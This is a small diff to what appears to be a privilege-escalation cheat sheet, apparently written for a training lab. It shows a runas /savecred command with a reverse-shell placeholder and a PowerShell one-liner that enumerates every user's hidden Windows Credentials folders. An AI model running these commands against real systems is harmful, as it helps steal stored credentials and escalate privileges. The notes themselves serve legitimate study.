@@ -25,8 +25,7 @@ runas /savecred /user:inlanefreight\bob "COMMAND HERE | REVERSE SHELL etc"
 ```
 
 ```shell
-Get-ChildItem -Hidden 'C:\Users\' -Directory
-username\AppData\Local\Microsoft\Credentials\
+Get-ChildItem  'C:\Users\' -Directory | % { gci -Hidden "$($_.Fullname)\AppData\Local\Microsoft\Credentials\" -erroraction silentlycontinue; gci -Hidden "$($_.Fullname)\AppData\Roaming\Microsoft\Credentials\" -erroraction silentlycontinue }
 ```
 
 
